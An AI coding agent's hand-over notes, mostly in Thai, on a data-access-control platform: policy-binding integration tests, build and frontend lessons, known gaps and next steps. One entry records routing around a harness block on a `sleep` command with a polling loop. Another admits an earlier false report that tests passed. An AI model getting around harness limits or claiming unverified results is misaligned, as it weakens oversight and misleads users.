**หน้า Governance:** filter tree แบบ **เก็บ ancestor ของทุก match** (ตัด node ที่ไม่ match ทิ้งดื้อๆ = ซ่อน parent ของ match ซึ่งคือสิ่งเดียวที่ต้องเห็นใน hierarchy)

**หน้า People:** อ่านอย่างเดียวโดยตั้งใจ — Entra กับ OM เป็นเจ้าของเนื้อหา sync รอบหน้าจะทับทุกอย่างที่พิมพ์ที่นี่ · ส่วนที่มีค่าที่สุดคือ **รายการ attribute key + จำนวนคนที่ถือจริง** เพราะ condition ที่อ้าง attribute ที่ไม่มีใครถือ = deny ทุกคน เงียบๆ และถูกต้องตาม logic ซึ่งเป็นความผิดพลาดที่มองเห็นยากที่สุดหลังจากนั้น

---

### 5. `PolicyBindingMaterializerIT` — 10 tests บน Postgres จริง

ไฟล์: `backend/dac-service/src/test/java/com/mfec/dac/policy/PolicyBindingMaterializerIT.java`

fixture คือ crawl เต็มรอบผ่าน `AssetStore` (ไม่ใช่ INSERT มือ) — เพราะ "tag ถูกถอดใน OM" กับ "crawl รอบใหม่ไม่มี tag นั้น" ต้องเป็นเหตุการณ์เดียวกัน
estate ที่ใช้: `prod-mssql.SalesDB.dbo.{customer, order}` + **`prod-mssql.SalesDBArchive.dbo.customer`** ที่ติด tag เหมือนกันเป๊ะ

| test | คุมอะไร |
|---|---|
| `bindsMatchingAssets` | ORG policy → `scanned 3 / matched 2 / added 2` และไม่ผูก table ที่ไม่มี tag |
| `bindingsAreJoinedToTheAsset` | แถว binding มี `asset_id` จริง ไม่ใช่แค่ FQN — FR-3.1.5 จะได้ไม่ต้อง match string ที่ rename แล้วพัง |
| `scopeIsComparedBySegment` | **กับดักหลัก** — scope `…SalesDB` ต้องเห็นแค่ 2 ตาราง และ **ไม่ลาก `SalesDBArchive`** (archive ติด tag เดียวกัน ตัวกันมีแค่ prefix guard) |
| `columnRulesBindColumns` | data policy ผูกถึง column + `match_reason` บอก `columnRule: 0` และ `MASK` |
| `resolvedAtSurvivesReResolve` | re-resolve ที่ไม่มีอะไรเปลี่ยน → `changed() == false` และ **`resolved_at` ไม่ขยับ** (เขียนเป็น diff ไม่ใช่ rebuild) |
| `unbindsWhenTagRemoved` | ถอด tag → crawl ใหม่ → `removed 1`, binding หายจริง |
| `newlyTaggedAssetIsCoveredOnRefresh` | ติด tag ให้ `order` แล้ว `refresh([order])` → ถูกคุ้มครองเองโดยไม่มีใครกดอะไร (FR-3.1.6) และ `resolved_at` ของ `customer` ไม่ถูกแตะ |
| `refreshOnlyTouchesNamedAssets` | `customer` เสีย tag แต่ refresh บอกแค่ `order` → **`customer` ต้องยังผูกอยู่** · ถ้าลบสิ่งที่ไม่ได้ evaluate = webhook ใบเดียวปลด policy ทั้ง estate |
| `refreshSkipsPoliciesOutOfScope` | refresh asset นอก scope → `scanned 0`, ไม่มีอะไรเปลี่ยน |
| `materializeAllCoversEveryPolicy` | nightly reconcile ครอบ policy ทุกตัว (รวม `DRAFT`) และแต่ละตัวได้ binding ตาม scope ของตัวเอง |

---

## What Worked

- **re-read by FQN แทนการ replay payload ของ event** — apply ซ้ำฟรี → poller rewind cursor ได้ และ webhook รับ redelivery ได้
- **`AssetRefresher` ใช้ descent ของ `AssetCrawler` กลางทาง** แทนเขียน inheritance ซ้ำ
- **แยก 404 ออกจาก error อื่น** — 404 = race ปกติ (ข้าม) · error อื่น = failed (cursor ไม่ขยับ)
- **retire ด้วย prefix ที่ผูกจุดและ escape LIKE** — กันลบ `prod.Sales` แล้วลาก `prod.SalesArchive` ไปด้วย
- **webhook ไม่ใส่ `@Secured` + ใช้ HMAC · unconfigured = 503**
- **แยก read query ออกจาก write store** (`CatalogQuery`/`GovernanceQuery`/`PrincipalQuery` vs `AssetStore`/`GovernanceStore`) — คนละ query shape คนละเหตุผลในการเปลี่ยน
- **เก็บ filter state ไว้ใน URL** ทั้ง `/catalog`, `/policies`, `/governance`
- **`AssetContextLoader` ตัวเดียวใช้ทั้ง materializer และ decision path** — ส่งเข้าไปทาง constructor ไม่ให้ใครสร้างเอง
- **append `policy_version` ก่อนแก้ `policy` เสมอ** — history ไม่ขึ้นกับความจำของคนเขียน code
- **unit test ที่เลือกคุมเฉพาะ failure mode ที่อันตราย** ไม่ใช่คุม output ทุกบรรทัด — `describeSelector(ว่าง) === 'nothing'` และ capability gap ของ cell masking
- เขียนไฟล์ใหญ่ด้วย **Write tool หรือ python heredoc** เชื่อถือได้
- **ให้ IT เป็นตัวยืนยันชื่อ constraint ที่ PostgreSQL ตั้งเอง แทนที่จะใส่ `IF EXISTS` แล้วปล่อยผ่าน** — `DROP CONSTRAINT` เปล่าๆ + `SourceEngineRegistryIT` แปลว่าการเดาชื่อผิดตายใน CI ไม่ใช่ตอน deploy (ข้อ AR.7)
- **registry ของ engine เป็น static list ในโค้ด ไม่ใช่ `ServiceLoader`** — engine ที่ platform นี้บังคับ policy ได้คือ**การตัดสินใจ** ไม่ใช่ผลข้างเคียงของการแพ็ก jar
- **`dialectId()` คืน String ไม่ใช่ `SqlDialect`** — โมดูลที่เปิด socket (`dac-connector-source`) จึงไม่ต้องขึ้นกับ SQL compiler ทั้งก้อน
- **ตารางอ้างอิง (`source_engine`) แทน `CHECK (engine IN (...))`** — ได้ guarantee เท่าเดิมแต่ **อ่านได้** → frontend เลิกถือสำเนารายชื่อ engine ของตัวเอง 6 ไฟล์
- **หา defect ชนิดเดียวกันซ้ำทั้ง repo หลังเจอตัวแรก** — `QueryService.dialectFor()` ที่ตกไปที่ Postgres เงียบๆ นำไปสู่การเจอ `enforcement.ts` ที่ยื่นประโยคของ SQL Server ให้ engine ตัวที่สาม ซึ่ง**ไม่มีใครรายงานได้เพราะหน้าจอไม่ได้ error**

## What Didn't Work

### Build / รันระบบ
- ❌ **Bash heredoc เขียนไฟล์ใหญ่** — พังซ้ำอีกรอบนี้ (`unexpected EOF while looking for matching '` ตอนเขียน `DataPolicyBuilder.tsx`) ทั้งที่ใช้ `<<'TSX'` → **ใช้ Write tool หรือ python patch script เท่านั้น**
- ❌ **`-DfailIfNoSpecifiedTests=false` อย่างเดียว** — ต้องมี **ทั้งสองตัว**: `-Dsurefire.failIfNoSpecifiedTests=false` **และ** `-Dfailsafe.failIfNoSpecifiedTests=false` ไม่งั้นรัน IT ตัวเดียวแล้ว build แดง
- ❌ **`./mvnw` โดยไม่มี `-am`** — module ต้นน้ำไม่ถูก build
- ❌ **curl ไปที่ `/v1/...` ตรงๆ** — 404/405 เพราะ `rootPath: /api/*` → ต้อง `/api/v1/...`
- ❌ **ลืม restart backend หลัง build** — โปรเซสเก่ายังถือ jar เดิม
- ❌ **`pkill java` บน Windows** — ไม่มี `pkill` ใน Git Bash ของเครื่องนี้ → ใช้ PowerShell `Get-CimInstance Win32_Process` กรอง `CommandLine` แล้ว `Stop-Process`
- ❌ **Vite พอร์ต 3000** — `listen EACCES` บนเครื่องนี้ (`vite.config.ts` ยัง default 3000 อยู่) ต้องส่ง `--port 5274`
- ❌ **`.env` ไม่ถูกโหลดเอง** — ต้อง `set -a && . ./.env && set +a` ก่อนรัน
- ❌ **`sleep 25 && tail`** ถูก harness บล็อก → ใช้ `until <check>; do sleep 2; done`
- ❌ ผลการรัน IT อ่านจาก `backend/dac-service/target/failsafe-reports/*.txt` **ไม่ใช่** `surefire-reports`
- ❌ **`@Nested` ใน `*IT.java` ที่ตั้งชื่อลงท้ายด้วย `Test` จะถูก surefire รันในเฟส unit ด้วย** — exclude ใน root pom เป็น `**/*IT.java` ซึ่ง match ตาม**ชื่อไฟล์** แต่ inner class คอมไพล์ออกมาเป็น `PolicyOverviewIT$CoverageTest` ซึ่งไปเข้า default include `**/*Test.java` ของ surefire แทน → IT ทั้งชุด **รันสองรอบ** (unit + failsafe) และถ้าพังในรอบแรก build จะตายก่อนที่ failsafe จะได้รัน · `IdentityAdminStoreIT` ไม่โดนเพราะตั้งชื่อ nested ว่า `Creating` / `Roles` / `Audit` **ไม่มีคำว่า Test** → **ตั้งชื่อ nested class ของ IT โดยไม่ลงท้ายด้วย `Test`** (รอบนี้เปลี่ยน `CoverageTest`→`Coverage`, `OverlapTest`→`Overlaps`, `OverrideNoteTest`→`OverrideNotes`, `ExampleTest`→`Examples`, `AppliedTest`→`AppliedToAsset`)
- ❌ **รายงานว่า IT ผ่านทั้งที่มันไม่เคยรัน** — รอบนี้เกิดขึ้นจริงและถูกแก้คำพูดกับผู้ใช้: log บอก `No tests matching pattern "PolicyOverviewIT" were executed!` บน `dac-parent` เพราะใช้ property ผิดชื่อ แต่ task รายงาน exit 0 → **เห็น `Tests run:` ของคลาสนั้นในlog ก่อน ถึงจะพูดได้ว่าผ่าน**
- ❌ **`git push origin main` ค้าง — หาเจอสาเหตุแล้ว** `credential.helper = manager` (Git Credential Manager) ถูกตั้งไว้ระดับ repo · GCM จะเปิดหน้าต่าง GUI ขอ login ซึ่ง session แบบ non-interactive กดไม่ได้ → push แขวนไปจน timeout (`GIT_TERMINAL_PROMPT=0` ไม่ช่วย เพราะมันกันแค่ prompt บน terminal) · `git ls-remote origin` ตอบปกติเพราะ repo เป็น public อ่านได้โดยไม่ต้อง auth · `gh` **ไม่ได้ติดตั้งบนเครื่องนี้** → **ผู้ใช้ต้อง `git push origin main` เองใน terminal ของตัวเองหนึ่งครั้ง** (หรือตั้ง PAT ไว้) · หลัง push ยืนยันด้วย `git ls-remote --heads origin` เสมอ อย่าเชื่อว่าสำเร็จเพราะคำสั่งไม่ error

### API / integration
- ❌ **ตั้งค่า `environment.getObjectMapper()` แล้วคิดว่า response จะเปลี่ยนตาม** — **ไม่เปลี่ยน** · Jersey resolve ObjectMapper ผ่าน **`ContextResolver<ObjectMapper>`** ก่อน ถ้าไม่มีก็ใช้ default ของมันเอง -> ต้อง register `@Provider` เอง (`json/JsonMapperProvider.java`) · วิธีพิสูจน์ที่เร็วที่สุดคือ log ค่า flag เทียบกับ response จริง ถ้า flag ถูกแต่ response ผิด แปลว่าคนละ instance
- ❌ **คิดว่า description จาก OM เป็น plain text** — มันเป็น **HTML** (`<p>...</p>`) ตั้งแต่ 2.0 -> ต้องผ่าน `lib/text.ts::plainText()` ก่อน render เสมอ
- ❌ **login แล้วอ่าน `token`** — field ที่ backend คืนคือ **`accessToken`** ไม่ใช่ `token`
- ❌ **ใช้ account คนจริงของ OpenMetadata เป็น connector credential** — เปลี่ยนไปใช้ **ingestion-bot JWT** แล้ว (mint ครั้งเดียว เก็บใน `.env`) · password ของ account คนจริงที่เคยวางในแชต **ผู้ใช้ควร rotate**
- ✅ **full sync กับ OM จริงสำเร็จ**: ~9 วินาที · **33 tables · 352 columns · 4,302 แถวใน `asset_facet`**
- ⚠️ **glossary facet ว่างเปล่า** — ไม่ใช่บั๊ก: OM instance นี้ยังไม่มีใครติด glossary term ให้ asset เลย (มีแต่ตัว glossary) → อย่าไปไล่หาสาเหตุใน mapper
- ❌ **`TRUNCATE asset, …` ใน IT** — `cannot truncate a table referenced in a foreign key constraint` เพราะ `policy_binding` (V3) / `enforcement_state` (V4) อ้าง `asset(id)` · แก้โดย **ไล่ชื่อตารางให้ครบ ไม่ใช้ `CASCADE`** — ตารางใหม่จะได้ fail ดังๆ ไม่ใช่ถูกล้างเงียบๆ
- ❌ **`assertThat(jdbi.withHandle(…))` → ambiguous** — ดึงออกมาเป็น local ที่ type ชัดก่อน
- ❌ **อ่าน exit code ของ background task แทนที่จะอ่าน log** — คำสั่งที่ต่อท้ายด้วย `; echo ...` หรือ `; tail ...` จะรายงาน exit code **ของตัวสุดท้าย** ไม่ใช่ของ maven → รอบนี้เห็น "exit 0" สองครั้งทั้งที่ compile พังจริง (`unclosed string literal`) · **ยืนยันด้วย surefire report หรือ `grep ERROR` ใน log เสมอ**
- ❌ **`-Dtest=Xxx` บน multi-module build** — module ที่ไม่มีเทสต์ชื่อนั้น (เช่น `dac-spec`) จะ fail ทั้ง build · property ที่ถูกคือ `-Dsurefire.failIfNoSpecifiedTests=false` ไม่ใช่ `-DfailIfNoSpecifiedTests=false` · วิธีที่สั้นกว่าคือรันทั้ง module ไปเลย
- ❌ **เขียน `
` ใน string ของ Java ผ่านสคริปต์ Python heredoc** — backslash ถูกตีความก่อนถึงไฟล์ กลายเป็น newline จริงกลาง string literal → **ใช้ text block (`"""`) เขียน SQL หลายบรรทัดแทน** อ่านง่ายกว่าและไม่มีทางโดน escape กินกลางทาง

### Frontend
- ❌ **`apiErrorMessage(error)`** — signature คือ **`apiErrorMessage(error: unknown, fallback: string)` สองอาร์กิวเมนต์** ลืมตัวที่สอง = compile error (เจอ 4 จุดรอบนี้)
- ❌ **`<Button href="/policies/new">`** — design-system `Button` จะ render เป็น `AriaLink` = **full page reload กลางๆ SPA** → ใช้ `useNavigate()` + `onPress` แทน
- ❌ **`onClick` บน `Button` ของ design system** — ต้อง **`onPress`** และ **`isDisabled`** ไม่ใช่ `disabled` (`<button>` ธรรมดายังใช้ `onClick` ตามปกติ)
- ❌ **ใช้ชื่อแท็บเป็น facet type ตอนลิงก์ไป catalog** — `facet_type` จริงคือ `tags | classifications | terms | glossaries | domains | dataProducts` · root ใต้ Classifications เป็น `classifications` แต่ลูกของมันเป็น `tags` → ถ้าส่งชื่อแท็บไปทั้งก้อน แถว tag จะลิงก์ไปที่ filter ที่ match ศูนย์แถว · แก้ด้วย `facetOf(tab, value)`
- ❌ **`NavItemBase.iconOnly` ใช้ไม่ได้** — prop ประกาศไว้ใน interface แต่ **ไม่ถูก destructure หรือใช้ใน body เลย** ทั้งสาม branch -> จะทำ icon rail ต้องเขียน nav item เอง อย่าส่ง prop นี้แล้วรอให้มันทำงาน
- ❌ **สไตล์ active state โดยแก้ vendored component** — `scripts/sync-om-design-system.sh` จะทับกลับ · และการเขียนเป็น rule ใน `theme/overrides.css` ก็พิสูจน์แล้วว่าตามยาก -> **ประกาศ class สีไว้บน element ใน component ของเราเอง**
- ❌ **`Tooltip` ครอบ `<button>` ธรรมดา** — ไม่ขึ้น · `TooltipTrigger` ของ react-aria ส่ง hover/focus handler ให้เฉพาะ trigger ที่รับมันเป็น (`AriaButton`, `Focusable`) · `<a>` ของ `NavLink` ก็เหมือนกัน ตอนพับรางจึงใช้ `title` ธรรมดาแทน
- ❌ **JDBI + `[1:3]` (array slice ของ Postgres) ในคิวรี** — เหตุผลเดียวกับ `ESCAPE '\'` ข้างล่าง: JDBI สแกน SQL หา named parameter เอง แล้วอ่าน `:3` เป็นพารามิเตอร์ชื่อ `3` → `UnableToCreateStatementException: Missing named parameter '3'` **ทุกครั้งที่เรียก** โดยที่ compile ผ่านและหน้าจอขึ้นแค่ error กลางๆ → **อย่าใส่ `:` ดิบๆ ใน SQL ที่ผ่าน JDBI** ไม่ว่าจะเป็น slice, cast `::`(ตัวนี้ JDBI รู้จัก) หรืออะไรก็ตาม — ถ้าเลี่ยงได้ให้ไปทำใน Java
- ❌ **JDBI + `ESCAPE '\'` ในคิวรี** — JDBI สแกน SQL เองเพื่อหา named parameter · backslash ใน string literal ทำให้มันคิดว่า string ยังไม่ปิด แล้ว `:name` ทุกตัวหลังจุดนั้น **ไม่ถูก bind** → Postgres ตอบ `syntax error at or near ":"` (เสีย 1 รอบ build กับเรื่องนี้) · **ใช้ `ESCAPE '!'` แทน** แล้ว escape เป็น `!!` / `!%` / `!_`
- ❌ **ให้ search ของ column match `fqn` ด้วย** — fqn ของ column ลงท้ายด้วย fqn ของ table ผลคือพิมพ์ชื่อ table แล้วได้ column ทุกตัวในตารางนั้นขึ้นมากลบตัว table เอง → column ต้อง match **เฉพาะ `name`**
- ❌ **ยกม่าน loading หลัง `await signIn()` สำเร็จ** — มีเฟรมที่ token มีแล้วแต่ม่านยังไม่ขึ้น หน้า guarded วาดแลบผ่าน (ผู้ใช้เห็นและชี้) → **ยกม่านตั้งแต่ submit** แล้วปิดทิ้งตอน error
- ❌ **fade หน้าใหม่โดยไม่ใส่ `key`** — element เดิมอยู่ยาว animation เล่นครั้งเดียวตอนเปิดหน้าแรกแล้วเงียบตลอดกาล → `key={pathname+search}` บังคับ remount
- ❌ **หน่วง transition ด้วยการเลื่อน `key` ของ wrapper** (เวอร์ชันแรกของ `RouteTransition`) — `key` คุมแค่ "remount เมื่อไหร่" **ไม่ได้คุมว่า render อะไร** · `children` เป็น `<Outlet />` ซึ่งอ่าน router context ตอน render อยู่แล้ว หน้าใหม่จึงขึ้นทันทีที่คลิก พอครบ 520ms `key` เปลี่ยน มันก็ remount หน้าเดิมที่เห็นอยู่แล้วพร้อม fade → อาการที่ผู้ใช้เจอคือ **"เปลี่ยนเลย แล้วค่อยแวบ"** เป๊ะตามที่ code ทำ (คอมเมนต์ในไฟล์เขียนว่า "หน้าเก่าค้างไว้" ทั้งที่ไม่เคยเก็บ element เก่าไว้เลย — comment ที่โกหกตัวเอง)
- ❌ **snapshot `children` ใส่ state เพื่อค้างหน้าเก่า** — คิดไว้เป็นทางแก้แล้วตัดทิ้ง เพราะ **ใช้ไม่ได้**: `<Outlet />` เป็น element ที่ผูกกับ context ไม่ใช่ snapshot ของ DOM · เก็บ element เดิมไว้ มันก็ render route ใหม่อยู่ดี → ต้องหน่วงที่ **location** (`<Routes location={display}>`) เท่านั้น
- ❌ **`onClick` บนแถวผลลัพธ์ที่อยู่ใน dropdown ของ input** — blur ของ input ปิด panel ทิ้งก่อนคลิกจะลง → `onMouseDown` + `preventDefault()`
- ❌ **`type="badge-modern"`** — ค่าที่ถูกคือ `type="modern"` · และ `Badge` ควรส่ง `type` ชัดเจนเสมอเพื่อให้ generic `BadgeColor<T>` inference ทำงาน
- ❌ **Jest พังทั้ง suite เพราะ `import logo from '…png'`** — แก้ด้วย `moduleNameMapper` → `src/__mocks__/fileMock.cjs` · **บทเรียน: รัน `yarn test` เต็มชุดทุกครั้ง**
- ❌ **`@testing-library/user-event` ไม่ได้ติดตั้ง** — ใช้ `fireEvent`
- ❌ **build ทับ jar ใต้ JVM ที่กำลังรันอยู่** — `verify` repackage `dac-service.jar` ทับไฟล์ที่ JVM เปิดค้างไว้ → endpoint ที่ login ไปแล้วยังทำงาน แต่ endpoint ที่ยังไม่เคยถูกเรียกจะพ่น `ClassNotFoundException` / `NoClassDefFoundError` ของคลาสใน jar ตัวเอง (รอบนี้เจ๊ `io.dropwizard.util.Throwables`, `org.glassfish.jersey.internal.inject.InjecteeImpl`) และ curl ได้ HTTP 000 — **ไม่ใช่บั๊กโค้ด แต่เสียเวลาไล่เหมือนเป็นบั๊ก** → **restart backend ทุกครั้งหลัง build ก่อนยิงทดสอบ**
- ❌ **jest default `testTimeout` 5s กับ ts-jest** — `findBy*` ตัวแรกของ suite จ่ายค่า type-check + compile กอง design system ทั้งกองไปด้วย (หลายสิบวินาทีต่อ suite ตอนเครื่องมีโหลด) → suite ที่ render หน้าหนักสุด (policy builder, app roles) **พังคนละชุดทุกรอบ** โดยที่โค้ดไม่ได้เปลี่ยน · timeout ที่ยิงตอน compile ไม่ได้บอกอะไรเกี่ยวกับโค้ด → **มีนาฬิกาสองตัว ต้องตั้งทั้งคู่** — `testTimeout: 30000` ใน `jest.config.cjs` (งบต่อเทสต์) และ `configure({ asyncUtilTimeout: 15000 })` ใน `src/setupTests.ts` (งบของ `findBy*` เอง default แค่ **1s**) · ตัวหลังหลอกที่สุด เพราะมันขึ้นว่า `Unable to find an element with the text: …` พร้อม dump DOM — อ่านเหมือน assertion ผิด ทั้งที่ DOM นั้นคือหน้าจอที่ render ทันในหนึ่งวินาที ไม่ใช่หน้าจอสุดท้าย
- ❌ Playwright browsers ไม่ได้ติดตั้ง — ใช้ `chromium.launch({ channel: 'msedge' })` และ script ต้องอยู่ใน `frontend/app/`
- ❌ **`shortFqn` ฉบับแรกคืน "สอง segment ท้าย"** — ใช้ไม่ได้กับข้อมูลจริง เพราะ domain สองชั้นท้ายยาวชั้นละ ~45 ตัวอักษร ผลคือชิปยาวเท่าเดิม → ต้องคิดเป็น **งบของ parent** (`PARENT_BUDGET = 18`) แล้วยุบ parent ที่ยาวเกินงบเป็น `…`
- ❌ **คิดจะตัด parent ทิ้งเสมอให้เหลือแค่ leaf** — `PII.Sensitive` กับ `MFEC-PDPA.Sentitive` จะเหลือ `Sensitive`/`Sentitive` ที่แยกไม่ออกว่ามาจากหมวดไหน = ชิปที่อ่านง่ายแต่ผิด
- ❌ **ปล่อยให้ `Badge` wrap เอง** — `Badge` ของ design system เป็น `size-max whitespace-nowrap` มันจะไม่ wrap แต่จะ**ยืด**จนดันทั้งแถว → ต้อง `max-w-*` ที่ `Badge` + `truncate` ที่ span ข้างใน
- ⚠️ MCP connector หลายตัวของ claude.ai ยังไม่ได้ authorize — session แบบ non-interactive ทำ OAuth ไม่ได้ ต้องไปกดใน claude.ai connector settings

---

## ช่องว่างที่รู้ตัวแล้วแต่ยังไม่ได้แก้

เขียนไว้ตรงนี้เพราะทุกข้อ **ดูเหมือนทำงานปกติจากข้างนอก** — เป็นชนิดที่จะถูกค้นพบตอนผิดแล้ว ถ้าไม่จด

1. **`scopeFqn` ของ policy ระดับ DOMAIN / SERVICE / DATABASE ถูกใช้เป็น prefix ของ FQN ทางกายภาพ** — ผูก policy ไว้ที่ชื่อ domain (`Finance.Risk`) มันจะ bind ไม่ติดอะไรเลย ทั้งที่หน้าจอดูเหมือนสร้างสำเร็จ ต้องแยก scope เชิง governance ออกจาก scope เชิงกายภาพ
2. **ยังไม่มี write API สำหรับ *attribute* ของ local principal (FR-2.2) และการติด facet แบบ local (FR-1.7)** — *account กับ app role เขียนได้แล้วตั้งแต่หัวข้อ W* แต่ `principal_attribute` ของ `analyst_a` / `steward_c` และ tag ของ demo ยังถูก seed ด้วย SQL ตรงๆ ไม่มีทางทำผ่าน UI → **ABAC ครึ่งฝั่ง user ยังแก้จากหน้าจอไม่ได้**
3. ~~**`PolicyResource.affecting` default `environment` เป็น `"dev"`**~~ — **แก้แล้วรอบนี้ (ข้อ X.2)** ทุก endpoint ใช้ `environmentOr()` ที่ fallback เป็น `DecisionService.DEFAULT_ENVIRONMENT` และฝั่ง TS default เป็น `'prod'`
4. **audit ของการ configure ยังไม่ครบ** — *identity ครบแล้ว* (`audit_identity_change` จาก V10: สร้าง account, enable/disable, ตั้ง password, grant/revoke role) แต่ **เปลี่ยน data source, เปลี่ยน OM settings, enable/disable source ยังไม่ถูกบันทึกที่ไหน**
5. ~~**`audit_decision.evaluation_ms` ไม่เคยถูกเขียนค่า**~~ — **ปิดแล้วรอบนี้ (ข้อ AE.5)** จับเวลาที่จุดที่ผู้เรียกรอจริงใน `QueryService` · ยังเหลือการอ่านค่ามาทำ p95 report จริงๆ ซึ่งอยู่ใน M8
6. **capability matrix ยังไม่รู้จัก masking function ต่อ dialect และไม่รู้จักเวอร์ชันของ engine** — ดูหัวข้อ I ข้างบน
7. ~~**`CANNOT_LOOSEN` เป็นค่าตาย**~~ — **ปิดแล้ว (ข้อ Y.1)** ลบทิ้งทั้ง Java และ TS เพราะมันเป็นคำตอบของคนละแกนกับ `relation`
8a. **asset ที่ match data source ไม่ได้ ถูกเก็บเงียบๆ โดยที่ UI ไม่บอก** — `AssetStore` ใช้ `.orElse(null)` เมื่อหา `om_service_fqn` ไม่เจอ → ตอนนี้ **36 จาก 40 asset มี `data_source_id IS NULL`** เขียน policy ได้แต่ enforce ไม่ได้ · ต้องมี banner/badge บอก และควรมีหน้า "source ที่ยังไม่ผูก" (ดูข้อ AC.3)
9. 🪤 **`PolicyStore.create` เติม `environment = 'dev'` ให้ policy ที่ไม่ได้ระบุ ขณะที่ทุก decision ตัดสินใน `prod`** — policy แบบนั้น **save ผ่าน bind ติด activate ได้ อ่านกลับมาครบ และไม่เคยถูกเรียกใช้** (ข้อ AE.3) · ยังไม่แก้เพราะการสลับ default แปลว่าแถวเก่าทุกแถวที่นอนอยู่ใน `dev` จะเริ่มบังคับใช้ทันทีที่ deploy — ต้องทำพร้อม migration ที่ตัดสินใจให้แต่ละแถวอย่างตั้งใจ
10. **jar เปิดเดี่ยวๆ ที่ `/Arak/` ไม่ได้ ต้องมี nginx ตัด prefix ให้เสมอ** — `SpaServlet` ไม่รู้จัก `web.basePath` เลย มันเสิร์ฟจาก `/` ล้วน · ถ้าใครตั้ง `proxy_pass http://127.0.0.1:8090` **ลืม slash ท้าย** prefix จะไม่ถูกตัด → ทุก asset 404 → **หน้าขาว** โดยที่ log ของ service ไม่มีอะไรผิดเลย (ข้อ AE.7) · ตอน deploy ให้เช็คด้วย `curl -I http://127.0.0.1:8090/assets/<ชื่อไฟล์จริง>` ว่าต้องได้ 200

11. **ancestor ของ domain ถูกทำเครื่องหมายว่า `direct`** — หน้า `demo-pg.salesdb.sales.customer` มีชิป domain สามตัว (`Finance`, `Finance / Risk`, `… / Risk / Credit`) และ probe แล้ว **ทั้งสามตัวเป็น `is_direct = true`** ทั้งที่ FR-2A.2 บอกว่า ancestor ที่กางออกมาควรเป็น `false` เหลือเฉพาะตัวล่างสุด · ยังไม่ได้แก้เพราะต้องดู `asset_facet` จริงก่อนว่าเป็นที่ข้อมูลหรือที่ materializer — **ถ้าเป็นบักจริง มันทำให้ "tag นี้มาจากไหน" ตอบผิด** (ดูข้อ AG.5)

8. ~~**builder default `environment: 'dev'` ขณะที่ engine enforce `prod`**~~ — **ปิดแล้ว (ข้อ Y.2)** default เป็น `ENFORCED_ENVIRONMENT` ค่าเดียวที่ทุกฝั่งใช้ร่วมกัน + เตือนเมื่อเลือก environment ที่ไม่ถูก enforce

---

## Next Steps

- ✅ **ข้อ AY เสร็จแล้ว** (Open in OpenMetadata ไม่ 500 · Request access มุมขวาบน · หัวหน้า asset แบบ OM · seed เคส demo) — ต่อด้วย **M9 slice 2** ข้างล่าง

0. **ต่อทันที (ผู้ใช้สั่ง 2026-09-25) — M9 slice 2 ดูข้อ AX.9:** Approve = ตัดสินใจเท่านั้น → Fulfil ด้วยมือ (ออก grant / เพิ่มเข้า policy เดิม / สร้าง policy ใหม่เป็น Draft) โดย Owner · Steward · Custodian · หน้า review: ข้อมูลผู้ขอ + impact + risk + suggestion + conflict · ไอคอน Inbox + badge บน header
0a. **ถัดไป:** Flowchart สำหรับอ่านระดับ table บนหน้า asset (ผู้ใช้ขอแล้ว — toggle text/diagram แบบ `PolicyFlowChart`, ค่าเริ่มต้นเป็นหน้าเดิม)
0b. **M6 ⏸️ ON HOLD** — ห้ามเริ่มจนกว่าผู้ใช้จะสั่ง
0c. **M16 (LLM ช่วยหา asset)** แยกเป็นงานของมันเอง ไม่ได้อยู่ใน Suggest รอบนี้ — Suggest รอบนี้เป็น rule-based ล้วน ไม่ส่งอะไรให้ LLM

1. **push ให้ขึ้น** — local นำหน้า remote อยู่ (remote main ยังอยู่ที่ `0029375` — local นำอยู่ 11 commit หลัง commit รอบนี้) · แก้เรื่อง `git push` ค้างก่อน (ดู What Didn't Work) แล้วยืนยันด้วย `git ls-remote --heads origin` · **scan secret ก่อน push ทุกครั้ง**
2. ~~**FR-7 Manual grant**~~ — **ปิดแล้วจริงรอบนี้** · รอบที่แล้วปิดด้วยการเช็คด้วยมือซึ่งแยกไม่ออกว่า grant ทำงานหรือไม่เคยถูกโหลด (ข้อ AE.4) · ตอนนี้มี `GrantCompositionIT` 13 tests บน Postgres จริงคุมอยู่ และการเขียนมันคือสิ่งที่ทำให้เจอบั๊กข้อ AE.1/AE.2 · *บันทึกเดิมของงานนี้:* · grant ระดับ table ให้ user/group ตรงๆ พร้อม start/end date · หน้า asset รื้อเป็น tab **Overview / Access / Policies / Columns / Audit** (อ้างอิง Immuta แต่ใช้ theme เรา) · tab Access ต้อง**แยกให้ชัดว่าสิทธิมาจาก direct grant หรือมาจาก policy** · group รองรับทุกแหล่ง (local + OM team + Entra ในอนาคต) · **grant ไม่ชนะ global policy** — compose แบบ intersection เหมือนเดิม
2a. **ผูก `demo-pg` เข้ากับ service ของ OM** — *รอคำตอบผู้ใช้* ว่า `demo-pg` คือ `dtp-iprm` หรือคนละเครื่อง (ดูข้อ AC.3) · ตราบใดที่ยังไม่ผูก asset 36 ตัวจาก OM จริงยัง enforce ไม่ได้เลย
2b. ~~**รันซ้ำ `AssetStoreIT` + `CatalogQueryIT`**~~ — **เขียวแล้วรอบนี้** ยืนยันว่าข้อ AC.4 เป็นเรื่อง Docker ไม่ใช่ regression จริง
3. **ปิด M3** — เหลือ ANTLR grammar ของ `expr` (FR-3.2) ข้อเดียว (**decision cache FR-5.5 ปิดแล้ว ดูข้อ AB**)
3. ~~**ปิด M4**~~ — **ปิดแล้ว** (FR-3.1.5 ข้อ X · FR-5.2 ข้อ Z · FR-5.3 ข้อ AA) · ของที่ค้างไว้จาก M4 ต่อได้ถ้าต้องการ: impact analysis ยังวัดเฉพาะ **table binding** (COLUMN binding ถูกครอบด้วย TABLE row ที่ materializer เขียนไว้อยู่แล้ว) และ cap 25×200 ยังเป็นค่าตายในโค้ด ไม่ได้ config
4. **ปิดช่องว่างข้อ 1–5 ข้างบน** โดยเฉพาะ **ข้อ 4 (audit ของการ configure)** ซึ่งเป็นของที่ auditor จะถามหาแน่นอน
5. **M2** — write API ของ principal/attribute แล้วต่อ (ก) การ assign application role จริงในหน้า `/settings/roles` (ข) หน้า local group ที่ `/settings/groups` ซึ่ง card ในหน้า Settings ลิงก์ไปรออยู่แล้ว · *(filter ตาม attribute ในหน้า People เสร็จแล้ว — ดูข้อ U)*
6. **M5 (secure view)** — ~~ViewCompiler + maintainer + dry-run/apply/rollback + หน้าจอ~~ **เสร็จแล้ว (ข้อ AK · AT · AU · AW)** · เหลือ **slice 4 MSSQL Testcontainers** · credential แยกสำหรับ DDL · cutover helper (FR-6.1.1) · `DbPrincipalProvisioner` — ดูข้อ AW.12
